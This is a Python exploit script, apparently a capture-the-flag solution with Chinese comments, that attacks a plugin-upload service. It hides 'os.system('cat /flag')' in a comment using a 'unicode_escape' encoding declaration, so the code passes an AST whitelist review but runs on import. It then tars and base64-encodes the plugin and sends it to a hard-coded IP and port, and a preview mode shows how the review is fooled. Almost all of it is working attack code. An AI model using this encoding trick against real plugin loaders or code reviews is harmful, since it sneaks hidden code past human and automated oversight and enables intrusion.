
import base64
import io
import socket
import sys
import tarfile

HOST = '103.163.47.230'
PORT = 35140

# 真正要执行的（解码后才成为代码）
REAL_CODE = "import os\nos.system('cat /flag')\n"


def esc(s: str) -> str:
    """把任意 ASCII 文本转成 \\xNN 序列"""
    return ''.join('\\x%02x' % b for b in s.encode('latin1'))


def build_plugin(real_code: str = REAL_CODE) -> bytes:
    src = (
        "# -*- coding: unicode_escape -*-\n"
        "def run():\n"
        "    return 1\n"
        "# " + esc('\n' + real_code + '\n')
    )
    return src.encode('ascii')


def build_tar(plugin_src: bytes) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w') as tf:
        info = tarfile.TarInfo('plugin.py')
        info.size = len(plugin_src)
        info.mtime = 0
        tf.addfile(info, io.BytesIO(plugin_src))
    return buf.getvalue()


def preview():
    """本地演示：原文(utf-8) vs 解码后(unicode_escape)"""
    src = build_plugin()
    print('--- 审查看到的源码 (utf-8) ---')
    print(src.decode())
    print('--- import 时实际执行的内容 (unicode_escape 解码) ---')
    print(codecs_decode(src))
    print('--- AST 白名单自检 ---')
    import ast
    tree = ast.parse(src.decode('utf-8'))
    ALLOWED = (ast.Module, ast.FunctionDef, ast.arguments, ast.Return,
               ast.Expr, ast.Call, ast.Name, ast.Load, ast.Constant)
    bad = [type(n).__name__ for n in ast.walk(tree) if not isinstance(n, ALLOWED)]
    print('违规节点:', bad or '无')
    funcs = [n.name for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]
    print('函数:', funcs)


def codecs_decode(b: bytes) -> str:
    import codecs
    return codecs.decode(b, 'unicode_escape')


def pwn(host=HOST, port=PORT, real_code=REAL_CODE):
    s = socket.create_connection((host, port), timeout=20)
    f = s.makefile('rwb')
    banner = f.readline().decode('utf-8', 'replace').strip()
    print('banner:', banner)
    tar = build_tar(build_plugin(real_code))
    f.write(base64.b64encode(tar) + b'\n')
    f.flush()
    data = b''
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    out = data.decode('utf-8', 'replace')
    print(out)
    return out


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'preview':
        preview()
    else:
        host = sys.argv[1] if len(sys.argv) > 1 else HOST
        port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
        pwn(host, port)
